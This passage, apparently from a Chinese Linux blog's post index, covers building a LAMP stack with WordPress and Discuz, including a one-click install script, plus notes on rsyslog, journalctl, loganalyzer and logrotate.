/usr/local/mysql/ $ cd /usr/local/mysql/ $ scripts/mysql_install_db --datadir=/data/mysqldb --user=mysql $ cp /usr/local/mysql/support-files/my-huge.cnf /etc/my.cnf $ sed -i '/\\[mysqld\\]/a\\datadir=/data/mysqldb' /etc/my.cnf $ cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld $ service mysqld start $ mysql -e 'create database wpdb' $ mysql -e \u0026quot;grant all on wpdb.* to wpuser@'192.168.1.%' identified by 'centos'\u0026quot; 编译安装fastcgi模式php $ tar xvf php-7.1.18.tar.bz2 $ cd php-7.1.18/ ./configure --prefix=/app/php \\ --enable-mysqlnd \\ --with-mysqli=mysqlnd \\ --with-openssl \\ --with-pdo-mysql=mysqlnd \\ --enable-mbstring \\ --with-freetype-dir \\ --with-jpeg-dir \\ --with-png-dir \\ --with-zlib \\ --with-libxml-dir=/usr \\ --enable-xml \\ --enable-sockets \\ --enable-fpm \\ --with-config-file-path=/etc \\ --with-config-file-scan-dir=/etc/php.d \\ --enable-maintainer-zts \\ --disable-fileinfo $ cp php.ini-production /etc/php.ini $ cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm $ chmod +x /etc/init.d/php-fpm $ cd /app/php/etc $ cp php-fpm.conf.default php-fpm.conf $ cp php-fpm.d/www.conf.default php-fpm.d/www.conf $ vim php-fpm.d/www.conf user = apache group = apache $ service php-fpm start 配置httpd支持php $ vim /app/httpd24/conf/httpd.conf #取消下面两行的注释 LoadModule proxy_module modules/mod_proxy.so LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so #修改下面行 \u0026lt;IfModule dir_module\u0026gt; DirectoryIndex index.php index.html \u0026lt;/IfModule\u0026gt; 加下面四行 AddType application/x-httpd-php .php AddType application/x-httpd-php-source .phps ProxyRequests Off ProxyPassMatch ^/(.*\\.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1 安装wrodpress  $ tar xf wordpress-4.9.4-zh_CN.tar.gz $ mv wordpress/* /app/httpd24/htdocs/ $ cd /app/httpd24/htdocs/ $ cp wp-config-sample.php wp-config.php $ vim wp-config.php /** WordPress数据库的名称 */ define('DB_NAME', 'wpdb'); /** MySQL数据库用户名 */ define('DB_USER', 'wpuser'); /** MySQL数据库密码 */ define('DB_PASSWORD', 'centos'); /** MySQL主机 */ define('DB_HOST', '192.168.1.8'); ab压力测试 $ ab -c 10 -n 100 http://192.168.1.8/ This is ApacheBench, Version 2.3 \u0026lt;$Revision: 1826891 $\u0026gt; Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking 192.168.1.8 (be patient).....done Server Software: Apache/2.4.33 Server Hostname: 192.168.1.8 Server Port: 80 Document Path: / Document Length: 52796 bytes Concurrency Level: 10 Time taken for tests: 6.137 seconds Complete requests: 100 Failed requests: 0 Total transferred: 5304400 bytes HTML transferred: 5279600 bytes Requests per second: 16.30 [#/sec] (mean) Time per request: 613.674 [ms] (mean) Time per request: 61.367 [ms] (mean, across all concurrent requests) Transfer rate: 844.11 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 0 0 1.0 0 10 Processing: 171 579 106.5 579 772 Waiting: 155 567 105.9 564 753 Total: 171 579 106.5 579 772 Percentage of the requests served within a certain time (ms) 50% 579 66% 624 75% 655 80% 664 90% 702 95% 723 98% 759 99% 772 100% 772 (longest request) You have mail in /var/spool/mail/root 结论：编译安装的php-fpm的php执行速度的确比yum一键安装的速度要块。\n安装discuz $ wget http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zip $ unzip Discuz_X3.3_SC_UTF8.zip $ cd upload/ $ cp -r * /data/www/ $ cd /data/www $ setfacl -R -m u:apache:rwx /data/www $ setfacl -R -b /data/www/ #完成discuz设置后取消acl权限。 配置httpd的多虚拟主机 在这之前，必须先把主配置文件的/app/httpd24/conf/httpd.conf，，前面配置wordpress时候加的代理去掉，如下\n$ vim /app/httpd24/conf/httpd.conf Include conf/extra/httpd-vhosts.conf #去掉注释。并将这四条注释掉，刚加的 #AddType application/x-httpd-php .php #AddType application/x-httpd-php-source .phps #ProxyRequests Off #ProxyPassMatch ^/(.*\\.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1 $ vim /app/httpd24/conf/extra/httpd-vhosts.conf \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026quot;/app/httpd24/htdocs\u0026quot; ServerName www.blog.com ErrorLog \u0026quot;logs/blog.com.error_log\u0026quot; TransferLog \u0026quot;logs/blog.com-access_log\u0026quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/$1 \u0026lt;directory /app/httpd24/htdocs\u0026gt; require all granted \u0026lt;/directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026quot;/data/www\u0026quot; ServerName www.bbs.com ErrorLog \u0026quot;logs/bbs.com.error_log\u0026quot; TransferLog \u0026quot;logs/bbs.com-access_log\u0026quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/data/www/$1 \u0026lt;directory /data/www\u0026gt; require all granted \u0026lt;/directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; $ apachectl restart 至此，实现了lamp的多虚拟主机的wordpress和discuz的php应用。\n一键安装lamp+wordpress+discuz脚本 ​\t博主无聊花了一个小时，写了一个编译安装lamp+wordpress+discuz的脚本。可以供centos6和centos7试验，已成功，代码如下，喜欢自取。\n$cat lamp.sh #!/bin/bash # #******************************************************************** #Author:\tLouiseHong #QQ: 992165098 #Date: 2018-06-03 #FileName：\tlamp.sh #URL: http://fenghong.tech/ #Description：\tThe test script #Copyright (C): 2018 All rights reserved #******************************************************************** #CentOS release 6.9 (Final) #kenerl 2.6.32-696.el6.x86_64 #------------------ #soruce #------------------ #\tapr-1.6.3 #\tapr-util-1.6.1 #\thttpd-2.4.33 #\tphp-7.1.18 #\tmariadb-10.2.15-linux-x86_64 #\twordpress-4.9.4-zh_CN #\tDiscuz_X3.3_SC_UTF8 function print_info(){ echo '##################show_info##############' echo '#Author: LouiseHong # ' echo '#QQ: 992165098 # ' echo '#Date: 2018-06-03 # ' echo '#FileName: lamp.sh # ' echo -e '\\033[1;31m#URL: http://fenghong.tech/ #\\033[0m' echo '######show install version and app#######' echo '# apr-1.6.3 #' echo '# apr-util-1.6.1 #' echo '# httpd-2.4.33 #' echo '# php-7.1.18 #' echo '# mariadb-10.2.15-linux-x86_64 #' echo '# wordpress-4.9.4-zh_CN #' echo '# Discuz_X3.3_SC_UTF8 #' echo '#########################################' echo -e '\\033[1;32m#press any key to start..ctrl+C to break#\\033[0m' echo '#########################################' } check() { if [ $? -eq 0 ];then echo -e '\\033[1;32mOK\\033[0m' else echo -e '\\033[1;31mError\\033[0m' exit\tfi } #----Dependace Install function install_dev() { yum groupinstall 'Development Tools' -y check yum install pcre-devel apr-devel apr-util-devel openssl-devel -y check yum install libxml2-devel bzip2-devel libmcrypt-devel -y check } #-------------------- #Source Get function source_wget() { cd ${dir} [ -f apr-1.6.3.tar.gz ] || wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-1.6.3.tar.gz check [ -f apr-util-1.6.1.tar.gz ] || wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-util-1.6.1.tar.gz check [ -f httpd-2.4.33.tar.bz2 ] || wget https://archive.apache.org/dist/httpd/httpd-2.4.33.tar.bz2 check [ -f php-7.1.18.tar.bz2 ] || wget http://mirrors.sohu.com/php/php-7.1.18.tar.bz2 check [ -f wordpress-4.9.4-zh_CN.tar.gz ] || wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz check [ -f Discuz_X3.3_SC_UTF8.zip ]|| wget http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zip check #[ -f mariadb-10.2.15-linux-x86_64.tar.gz ] || wget https://downloads.mariadb.org/f/mariadb-10.2.15/bintar-linux-x86_64/mariadb-10.2.15-linux-x86_64.tar.gz/from/http%3A//mirrors.tuna.tsinghua.edu.cn/mariadb/?serve [ -f mariadb-10.2.15-linux-x86_64.tar.gz ] || wget ftp://172.20.0.1/pub/Sources/sources/mariadb/mariadb-10.2.15-linux-x86_64.tar.gz check } #-------------------- #-------Install Httpd function install_httpd() { cd ${dir} id apache \u0026amp;\u0026gt; /dev/null || useradd -r -d /app/httpd24 -s /sbin/nologin apache tar xf apr-1.6.3.tar.gz tar xf apr-util-1.6.1.tar.gz tar xf httpd-2.4.33.tar.bz2 mv apr-1.6.3 httpd-2.4.33/srclib/apr mv apr-util-1.6.1 httpd-2.4.33/srclib/apr-util/ cd httpd-2.4.33/ ./configure --prefix=/app/httpd24 \\ --enable-so \\ --enable-ssl \\ --enable-cgi \\ --enable-rewrite \\ --with-zlib \\ --with-pcre \\ --with-included-apr \\ --enable-modules=most \\ --enable-mpms-shared=all \\ --with-mpm=prefork check make -j $cpus \u0026amp;\u0026amp; make install check } #-------Install MariaDB function install_mariadb() { cd ${dir} id mysql \u0026amp;\u0026gt; /dev/null || useradd -r -d /app/mysqldb -s /sbin/nologin mysql mkdir /app/mysqldb -pv \u0026amp;\u0026amp; chown mysql.mysql /app/mysqldb \u0026amp;\u0026amp; chmod 770 /app/mysqldb tar xf mariadb-10.2.15-linux-x86_64.tar.gz -C /usr/local cd /usr/local ln -s mariadb-10.2.15-linux-x86_64/ mysql \u0026amp;\u0026amp; chown -R root:mysql /usr/local/mysql/ } function install_mariadb_conf() { cd /usr/local/mysql/ scripts/mysql_install_db --datadir=/app/mysqldb --user=mysql check cp -f /usr/local/mysql/support-files/my-huge.cnf /etc/my.cnf sed -i '/\\[mysqld\\]/adatadir=/app/mysqldb' /etc/my.cnf [ -f /etc/init.d/mysqld ] || cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld } #-------Install php function install_php() { cd ${dir} tar xf php-7.1.18.tar.bz2 cd php-7.1.18/ ./configure --prefix=/app/php \\ --enable-mysqlnd \\ --with-mysqli=mysqlnd \\ --with-openssl \\ --with-pdo-mysql=mysqlnd \\ --enable-mbstring \\ --with-freetype-dir \\ --with-jpeg-dir \\ --with-png-dir \\ --with-zlib \\ --with-libxml-dir=/usr \\ --enable-xml \\ --enable-sockets \\ --enable-fpm \\ --with-config-file-path=/etc \\ --with-config-file-scan-dir=/etc/php.d \\ --enable-maintainer-zts \\ --disable-fileinfo check make -j $cpus \u0026amp;\u0026amp; make install check } function install_php_conf() { cd ${dir}/php-7.1.18/ cp -f php.ini-production /etc/php.ini cp -f sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm chmod +x /etc/init.d/php-fpm cp /app/php/etc/php-fpm.conf.default /app/php/etc/php-fpm.conf cp /app/php/etc/php-fpm.d/www.conf.default /app/php/etc/php-fpm.d/www.conf sed -i 's/nobody/apache/g' /app/php/etc/php-fpm.d/www.conf } #--------install_wordpress function install_wordpress_conf() { cd ${dir} tar xf wordpress-4.9.4-zh_CN.tar.gz check mv wordpress/* /app/httpd24/htdocs/ cd /app/httpd24/htdocs/ chown -R apache.apache * cp wp-config-sample.php wp-config.php sed -i \u0026quot;s/database_name_here/wpdb/\u0026quot; wp-config.php sed -i \u0026quot;s/username_here/wpuser/\u0026quot; wp-config.php sed -i \u0026quot;s/password_here/centos/\u0026quot; wp-config.php } function install_discuz_conf() { [ -d /app/www ] || mkdir /app/www -pv cd ${dir} unzip Discuz_X3.3_SC_UTF8.zip check cp -r upload/* /app/www/ } function install_httpd_conf() { sed -i '$aInclude conf/extra/httpd-test.conf' /app/httpd24/conf/httpd.conf sed -i 's/daemon/apache/g' /app/httpd24/conf/httpd.conf cat \u0026gt;\u0026gt; /app/httpd24/conf/extra/httpd-test.conf \u0026lt;\u0026lt;-EOF LoadModule proxy_module modules/mod_proxy.so LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026quot;/app/httpd24/htdocs\u0026quot; ServerName www.blog.com ErrorLog \u0026quot;logs/blog.com.error_log\u0026quot; TransferLog \u0026quot;logs/blog.com-access_log\u0026quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/httpd24/htdocs/\\$1 \u0026lt;directory /app/httpd24/htdocs\u0026gt; require all granted \u0026lt;/directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot \u0026quot;/app/www\u0026quot; ServerName www.bbs.com ErrorLog \u0026quot;logs/bbs.com.error_log\u0026quot; TransferLog \u0026quot;logs/bbs.com-access_log\u0026quot; DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/app/www/\\$1 \u0026lt;directory /app/www\u0026gt; require all granted \u0026lt;/directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; EOF check sed -i '$a/app/httpd24/bin/apachectl start' /etc/rc.d/rc.local } function install_lamp(){ [ -d ${dir} ] || mkdir ${dir} -pv \u0026amp;\u0026gt; /dev/null install_dev source_wget install_httpd install_mariadb install_mariadb_conf install_php install_php_conf install_wordpress_conf install_discuz_conf install_httpd_conf /app/httpd24/bin/apachectl restart service php-fpm restart service mysqld restart /usr/local/mysql/bin/mysql -e 'create database IF NOT EXISTS wpdb' /usr/local/mysql/bin/mysql -e \u0026quot;grant all on wpdb.* to wpuser@'localhost' identified by 'centos'\u0026quot; echo \u0026quot;PATH=/app/php/bin:/app/php/sbin:/app/httpd24/bin:/usr/local/mysql/bin:$PATH\u0026quot; \u0026gt; /etc/profile.d/lamp.sh chkconfig --add mysqld chkconfig --add php-fpm } test_lamp(){ cat \u0026gt;\u0026gt; /app/httpd24/htdocs/test.php \u0026lt;\u0026lt;-EOF \u0026lt;?php \\$dsn='mysql:host=127.0.0.1;dbname=mysql'; \\$username='root'; \\$passwd=''; \\$dbh=new PDO(\\$dsn,\\$username,\\$passwd); var_dump(\\$dbh); ?\u0026gt; EOF curl 127.0.0.1/test.php |grep -q PDO \u0026amp;\u0026amp; echo -e \u0026quot;\\033[32mLAMP Test Completed, Is Working!\\033[0m\u0026quot; || echo -e \u0026quot;\\033[31mSorry, Test failed, Please check!\\033[0m\u0026quot; } cpus=`cat /proc/cpuinfo |grep processor|wc -l` dir='/app/sours' trap 'exit' 2 clear print_info 2\u0026gt;\u0026amp;1 | tee -a ${dir}/install.log read -p '' install_lamp 2\u0026gt;\u0026amp;1 | tee -a ${dir}/install.log test_lamp 运行./lamp完成后，试验端口是否开启。访问http://localhost/\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using localhost.localdomain. Set the 'ServerName' directive globally to suppress this message httpd not running, trying to start httpd not running, trying to start Gracefully shutting down php-fpm warning, no pid file found - php-fpm is not running ? Starting php-fpm done ERROR! MariaDB server PID file could not be found! Starting MariaDB180623 20:37:04 mysqld_safe Logging to '/app/mysqldb/localhost.localdomain.err'. .180623 20:37:04 mysqld_safe Starting mysqld daemon with databases from /app/mysqldb .. SUCCESS! $ss -ntl State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 127.0.0.1:9000 *:* LISTEN 0 80 :::3306 :::* LISTEN 0 128 :::80 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-22-lamp2/","tags":["Linux"],"title":"LAMP2"},{"categories":["internet"],"contents":"摘要：日志相关，journalctl，远程日志，基于MySQL的日志，loganalyzer网页展示\n日志介绍  日志：  历史事件:时间，地点，人物，事件 日志级别：事件的关键性程度，Loglevel\n 系统日志服务：  sysklogd :CentOS 5之前版本 syslogd: system application 记录应用日志 klogd: linux kernel 记录内核日志   事件记录格式：日期时间 主机 进程[pid]: 事件内容\n  C/S架构：通过TCP或UDP协议的服务完成日志记录传送，将分布在不同主机的日志实现集中管理\n  udp协议\nrsyslog  rsyslog特性：CentOS6和7    多线程 UDP, TCP, SSL, TLS, RELP MySQL, PGSQL, Oracle实现日志存储 强大的过滤器，可实现过滤记录日志信息中任意部分 自定义输出格式    ELK：elasticsearch, logstash, kibana    非关系型分布式数据库 基于apache软件基金会jakarta项目组的项目lucene Elasticsearch是个开源分布式搜索引擎 Logstash对日志进行收集、分析，并将其存储供以后使用 kibana 可以提供的日志分析友好的 Web 界面    配置文件/etc/rsyslog.conf，/etc/rsyslog.d/*.conf格式：由三部分组成    MODULES：相关模块配置 GLOBAL DIRECTIVES：全局配置 RULES：日志记录相关的规则配置   配置rsyslog成为日志服务器 #### MODULES #### # Provides UDP syslog reception $ModLoad imudp $UDPServerRun 514 # Provides TCP syslog reception $ModLoad imtcp $InputTCPServerRun 514 journalctl Systemd 统一管理所有 Unit 的启动日志。带来的好处就是，可以只用journalctl一个命令，查看所有日志（内核日志和应用日志）。日志的配置文件/etc/systemd/journald.conf\njournalctl用法 ##查看所有日志（默认情况下 ，只保存本次启动的日志） $ journalctl ##查看内核日志（不显示应用日志） $ journalctl -k ##查看系统本次启动的日志 $ journalctl -b $ journalctl -b -0 ##查看上一次启动的日志（需更改设置） $journalctl -b -1 ##查看指定时间的日志 $ journalctl --since=\u0026quot;2017-10-30 18:10:30\u0026quot; $ journalctl --since \u0026quot;20 min ago\u0026quot; $ journalctl --since yesterday $ journalctl --since \u0026quot;2017-01-10\u0026quot; --until \u0026quot;2017-01-11 03:00\u0026quot; $ journalctl --since 09:00 --until \u0026quot;1 hour ago\u0026quot; ##显示尾部的最新10行日志 $ journalctl -n ##显示尾部指定行数的日志 $ journalctl -n 20 ##实时滚动显示最新日志 $ journalctl -f journalctl日志优先级管理 查看指定优先级（及其以上级别）的日志，共有8级 0. emerg\n alert crit err warning notice info debug  示例如下：\n$ journalctl -p err -b $ 日志默认分页输出，--no-pager 改为正常的标准输出 $ journalctl --no-pager journalctl输出的格式\n#以JSON格式（单行）输出 $ journalctl -b -u nginx.service -o json #以JSON格式（多行）输出，可读性更好 $ journalctl -b -u nginx.serviceqq -o json-pretty #显示日志占据的硬盘空间 $ journalctl --disk-usage #指定日志文件占据的最大空间 $ journalctl --vacuum-size=1G #指定日志文件保存多久 $ journalctl --vacuum-time=1years vim /etc/hosts\n(1) 准备MySQL Server (2) 在mysql server上授权rsyslog能连接至当前服务器 GRANT ALL ON Syslog.* TO 'syslog'@'HOST' IDENTIFIED BY 'centos'; FLUSH PRIVILEGES; (3) 在rsyslog服务器上安装mysql模块相关的程序包 yum install rsyslog-mysql (4) 为rsyslog创建数据库及表； mysql -uUSERNAME -hHOST -pPASSWORD \u0026lt; /usr/share/doc/rsyslog-7.4.7/mysql-createDB.sql ###配置rsyslog将日志保存到mysql中 $vim /etc/rsyslog.conf #### MODULES #### $ModLoad ommysql #### RULES #### *.info;mail.none;authpriv.none;cron.none :ommysql:HOST,Syslog,syslog,centos loganalyzer日志展示软件\nyum install httpd php php-mysql php-gd $ systemctl restart httpd $ cd /var/www/html $ vim test.php \u0026lt;?php $dsn='mysql:host=DBhost;dbname=Syslog'; $username='syslog'; $passwd='centos'; $dbh=new PDO($dsn,$username,$passwd); var_dump($dbh); ?\u0026gt; 安装loganalyzer,并填写安装向导source Type MYSQL Native，注意数据库和上面的一样\n$ wget $ tar xf loganalyzer-4.1.6.tar.gz $ cp -r loganalyzer-4.1.6/src /var/www/html/log $ cd /var/www/html $ touch config.php $ chmod 666 config.php ###网页向导完成安装之后，回收权限 $ chmod 644 config.php Logrotate  logrotate 程序是一个日志文件管理工具。用来把旧的日志文件删除，并创建新的日志文件，称为日志转储或滚动。可以根据日志文件的大小，也可以根据其天数来转储，这个过程一般通过 cron 程序来执行 配置文件是 /etc/logrotate.conf 主要参数如下:  compress #通过gzip 压缩转储以后的日志 nocompress #不需要压缩时，用这个参数 copytruncate #用于还在打开中的日志文件，把当前日志备份并截断 nocopytruncate #备份日志文件但是不截断 create mode owner group #转储文件，使用指定的文件模式创建新的日志文件 nocreate #不建立新的日志文件 delaycompress #和compress一起使用时，转储的日志文件到下一次转储时才压缩 nodelaycompress #覆盖 delaycompress 选项，转储并压缩 errors address #专储时的错误信息发送到指定的Email 地址 ifempty #即使是空文件也转储，是缺省选项。 notifempty #如果是空文件的话，不转储 mail address #把转储的日志文件发送到指定的E-mail 地址 nomail #转储时不发送日志文件 olddir directory #转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统 noolddir #转储后的日志文件和当前日志文件放在同一个目录下 prerotate/endscript #在转储以前需要执行的命令可以放入这个对，这两个关键字必须单独成行 postrotate/endscript #在转储以后需要执行的命令可以放入这个对，这两个关键字必须单独成行 daily #指定转储周期为每天 weekly #指定转储周期为每周 monthly #指定转储周期为每月 size #大小 指定日志超过多大时，就执行日志转储 rotate count #指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份 Missingok #如果日志不存在，提示错误 Nomissingok #如果日志不存在，继续下一次日志，不提示错误 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-22-log/","tags":["Linux","log"],"title":"Log"},{"categories":["Http"],"contents":"摘要：lamp简介，快速部署lamp，xcache加速php，php应用phpmyadmin/wordpress/discuz搭建。\nLAMP LAM(M)P： linux,apache (httpd), mysql, mariadb,memcached,php, perl, python\n WEB资源类型：  静态资源：原始形式与响应内容一致，在客户端浏览器执行\n\u0026lt;script type=\u0026quot;test/javescript\u0026quot;\u0026gt; document.write(new date()); \u0026lt;/script\u0026gt; 动态资源：原始形式通常为程序文件，需要在服务器端执行之后，将执行结果返回给客户端\n\u0026lt;?php phpinfo(); ?\u0026gt;  Web相关语言  客户端技术： html，javascript 服务器端技术：php, jsp，python，asp\n httpd：接收用户的web请求；静态资源则直接响应；动态资源为php脚本，对此类资源的请求将交由php来运行 php：运行php程序 MariaDB：数据管理系统 http与php结合的方式CGI/FastCGI  常见的LAMP应用  PhpMyAdmin是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库 WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可把 WordPress当作一个内容管理系统（CMS）来使用 PHPWind:2003年发布了PHPWind的前身版本ofstar，并发展成为包含BBS、CMS、博客、SNS等一系列程序的通用型建站软件, 于2008年加入阿里巴巴集团 Crossday Discuz! Board（简称 Discuz!）是一套通用的社区论坛软件系统。自2001年6月面世以来，是全球成熟度最高、覆盖率最大的论坛软件系统之一。2010年8月23日，与腾讯达成收购协议 ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2006年6月，ECShop推出第一个版本1.0  快速部署LAMP 默认centos7系统\n$ yum -y install httpd mariadb-server php php-mysql $ systemctl start httpd $ systemctl start mariadb $ mysql -e \u0026quot;grant all on *.* to test@'192.168.1.%' identified by 'centos';\u0026quot; $ mysql_secure_installation #设置mysql数据库的root密码 使用pdo测试php是否已经链接数据库,网站访问http://localhost/test.php,即可测试是否成功。\n$ cd /var/www/html $ vim test.php \u0026lt;?php try { $user='test'; $pass='centos'; $dbh = new PDO('mysql:host=192.168.1.8;dbname=mysql', $user, $pass); foreach($dbh-\u0026gt;query('SELECT user,host from user') as $row) { print_r($row); } $dbh = null; } catch (PDOException $e) { print \u0026quot;Error!: \u0026quot; . $e-\u0026gt;getMessage() . \u0026quot;\u0026lt;br/\u0026gt;\u0026quot;; die(); } ?\u0026gt; wordpress博客搭建 ​\tWordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设属于自己的网站。也可把 WordPress当作一个内容管理系统（CMS）来使用.\n​\t下载安装wordpress,更改配置文件，网站访文http://localhost/wordpress,进行页面设置。前提：已经搭建好LAMP\n$ wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz $ tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html/ $ cd /var/www/html/wordpress/ $ cp wp-config-sample.php wp-config.php $ vim wp-config.php define('DB_NAME', 'wpdb'); /** MySQL数据库用户名 */ define('DB_USER', 'wpdba'); /** MySQL数据库密码 */ define('DB_PASSWORD', 'centos'); Phpmyadmin搭建 ​\tPhpMyAdmin是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库\n下载安装phpadmin,相关的设置和管理需要进入页面http://localhost/。前提：已经搭建好LAMP\n$ wget https://files.phpmyadmin.net/phpMyAdmin/4.0.10.20/phpMyAdmin-4.0.10.20-all-languages.tar.gz $ tar xvf phpMyAdmin-4.0.10.20-all-languages.tar.gz -C /var/www/html $ cd /var/www/html/ $ mv phpMyAdmin-4.0.10.20-all-languages/ phpadmin $ cd phpadmin $ cp config.sample.inc.php config.inc.php $ yum -y install php-mbstring $ systemctl restart httpd 编译安装xcache加速php  php的加速器：基于PHP的特殊扩展机制如opcode缓存扩展也可以将opcode缓存于php的共享内存中，从而可以让同一段代码的后续重复执行时跳过编译阶段以提高性能。这些加速器并非真正提高了opcode的运行速度，而仅是通过分析opcode后并将它们重新排列以达到快速执行的目的。 xache：快速而且稳定的PHP opcode缓存，经过严格测试且被大量用于生产环境。项目地址：http://xcache.lighttpd.net/,收录EPEL源。  $ wget http://xcache.lighttpd.net/pub/Releases/3.2.0/xcache-3.2.0.tar.gz $ yum install -y 'Development Tools' $ yum install -y php-devel $ tar xf xcache-3.2.0.tar.gz $ cd ./xcache-3.2.0/ $ phpize $ ./configure --enable-xcache --with-php-config=/usr/bin/php-config $ make -j 4 \u0026amp;\u0026amp; make install #会生成xcache.so文件 $ ll /usr/lib64/php/modules -rwxr-xr-x. 1 root root 74688 Nov 6 2016 curl.so -rwxr-xr-x. 1 root root 2713376 Nov 6 2016 fileinfo.so -rwxr-xr-x. 1 root root 44688 Nov 6 2016 json.so -rwxr-xr-x. 1 root root 1305792 Nov 6 2016 mbstring.so -rwxr-xr-x. 1 root root 146048 Nov 6 2016 mysqli.so -rwxr-xr-x. 1 root root 57936 Nov 6 2016 mysql.so -rwxr-xr-x. 1 root root 33184 Nov 6 2016 pdo_mysql.so -rwxr-xr-x. 1 root root 116344 Nov 6 2016 pdo.so -rwxr-xr-x. 1 root root 29176 Nov 6 2016 pdo_sqlite.so -rwxr-xr-x. 1 root root 271992 Nov 6 2016 phar.so -rwxr-xr-x. 1 root root 51360 Nov 6 2016 sqlite3.so -rwxr-xr-x. 1 root root 700936 Jun 21 23:37 xcache.so -rwxr-xr-x. 1 root root 58392 Nov 6 2016 zip.so $ cp xcache.ini /etc/php.d/ $ systemctl restart httpd 可以测试一下xcache的加速，使用httpd的测压力工具ab进行测试，看看加速情况。\nfastcgi模式下的LAMP php的相关配置  配置文件：/etc/php.ini，/etc/php.d/*.ini  Module下，重启Httpd服务 FastCGI模式下，重启php-fpm服务\n 配置文件格式   配置文件格式：[foo]:Section Header Directive=value 注释符：# 纯粹的注释信息 ; 用于注释可启动的指令 说明：在较新的版本中，已经完全使用”;”进行注释 php.ini核心配置的详细说明： http://php.net/manual/zh/ini.core.php Php.ini配置选项列表： http://php.net/manual/zh/ini.list.php\n  fcgi服务配置文件：/etc/php-fpm.conf, /etc/php-fpm.d/*.conf 连接池：  pm = static|dynamic static：固定数量的子进程；pm.max_children dynamic：子进程数量以动态模式管理 pm.max_children pm.start_servers pm.min_spare_servers pm.max_spare_servers pm.max_requests = 500  确保运行php-fpm进程的用户对session目录有读写权限  mkdir /var/lib/php/session chown apache.apache /var/lib/php/session  配置httpd，添加/etc/httpd/conf.d/fcgi.conf配置文件，内容类似  $ vim /etc/httpd/conf.d/fcgi.conf DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*\\.php)$ fcgi://127.0.0.1:9000/var/www/html/$1 #注意：在HTTPD服务器上必须启用proxy_fcgi_module模块，充当PHP客户端 $ httpd –M |grep fcgi $ cat /etc/httpd/conf.modules.d/00-proxy.conf 基于php-fpm安装lamp  和前面快速lamp的安装基本差不多，：  $ yum -y install php-fpm php-mysql httpd mariadb-server  配置数据库账户  $ systemctl start mariadb httpd $ mysql -e \u0026quot;grant all on *.* to test@'192.168.1.%' identified by 'centos'\u0026quot; $ mysql -e 'flush privileges'  测试php-fpm是否连上数据库，提供以下php页面，访问http://localhost/test.php  $ vim test.php \u0026lt;?php try { $user='test'; $pass='centos'; $dbh = new PDO('mysql:host=192.168.1.8;dbname=mysql', $user, $pass); foreach($dbh-\u0026gt;query('SELECT user,host from user') as $row) { print_r($row); } $dbh = null; } catch (PDOException $e) { print \u0026quot;Error!: \u0026quot; . $e-\u0026gt;getMessage() . \u0026quot;\u0026lt;br/\u0026gt;\u0026quot;; die(); } ?\u0026gt;  配置apache服务并支持php-fpm,修改完配置文件记得重启服务。  $ vim /etc/httpd/conf/httpd.conf DocumentRoot \u0026quot;/data/www\u0026quot; \u0026lt;Directory \u0026quot;/var/www\u0026quot;\u0026gt; AllowOverride None # Allow open access: Require all granted \u0026lt;/Directory\u0026gt; $ vim /etc/httpd/conf.d/fcgi.conf DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*.php)$ fcgi://127.0.0.1:9000/data/www/$1 $ systemctl restart httpd $ systemctl start php-fpm Discuz论坛部署 ​\tCrossday Discuz! Board（简称 Discuz!）是一套通用的社区论坛软件系统。自2001年6月面世以来，是全球成熟度最高、覆盖率最大的论坛软件系统之一。2010年8月23日，与腾讯达成收购协议。\n​\tphp常见应用Discuz，wordpress；上面已经实现了wordpress个人博客搭建，PhpMyAdmin的web页面管理数据库，这里介绍Discuz_X-3.3的论坛搭建。\n$ wget 